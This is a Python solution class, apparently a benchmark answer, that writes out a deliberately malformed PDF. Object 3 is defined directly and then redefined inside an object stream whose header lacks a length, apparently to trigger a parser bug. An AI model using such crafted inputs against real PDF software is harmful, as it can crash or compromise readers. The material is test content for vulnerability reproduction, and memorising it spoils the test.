class Solution:
    def solve(self, src_path: str) -> bytes:
        parts = []
        parts.append('%PDF-1.4')
        parts.append('')

        # Object 1
        parts.append('1 0 obj')
        parts.append('<< /Type /Catalog /Pages 2 0 R >>')
        parts.append('endobj')
        parts.append('')

        # Object 2
        parts.append('2 0 obj')
        parts.append('<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
        parts.append('endobj')
        parts.append('')

        # Object 3 direct
        parts.append('3 0 obj')
        parts.append('<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>')
        parts.append('endobj')
        parts.append('')

        # Object 4 content stream
        content_lines = [
            'BT',
            '/F1 12 Tf',
            '100 700 Td',
            '(Hello, World!) Tj',
            'ET'
        ]
        content_str = '\n'.join(content_lines) + '\n'
        length4 = len(content_str)
        parts.append('4 0 obj')
        parts.append(f'<< /Length {length4} >>')
        parts.append('stream')
        for cl in content_lines:
            parts.append(cl)
        parts.append('endstream')
        parts.append('endobj')
        parts.append('')

        # Object 5
        parts.append('5 0 obj')
        parts.append('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
        parts.append('endobj')
        parts.append('')

        # Object 6 ObjStm redefining 3
        objstm_lines = [
            '3 0',
            '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>'
        ]
        first_pos = 0
        parts.append('6 0 obj')
        parts.append(f'<< /Type /ObjStm /N 1 /First {first_pos} >>')
        parts.append('stream')
        for ol in objstm_lines:
            parts.append(ol)
        parts.append('endstream')
        parts.append('endobj')
        parts.append('')

        full_pre_xref = '\n'.join(parts) + '\n'

        # Find offsets
        pos1 = full_pre_xref.find('1 0 obj')
        pos2 = full_pre_xref.find('2 0 obj', pos1 + 1)
        pos3 = full_pre_xref.find('3 0 obj', pos2 + 1)
        pos4 = full_pre_xref.find('4 0 obj', pos3 + 1)
        pos5 = full_pre_xref.find('5 0 obj', pos4 + 1)
        pos6 = full_pre_xref.find('6 0 obj', pos5 + 1)

        # Build xref
        xref_pos = len(full_pre_xref)
        xref_lines = [
            'xref',
            '0 7',
            '0000000000 65535 f ',
            f'{pos1:010} 00000 n ',
            f'{pos2:010} 00000 n ',
            f'{pos3:010} 00000 n ',
            f'{pos4:010} 00000 n ',
            f'{pos5:010} 00000 n ',
            f'{pos6:010} 00000 n '
        ]
        xref_str = '\n'.join(xref_lines) + '\n'

        # Trailer
        trailer_str = f'''trailer
<< /Size 7 /Root 1 0 R >>
startxref
{xref_pos}
%%EOF'''

        full_pdf = full_pre_xref + xref_str + trailer_str
        return full_pdf.encode('latin-1')
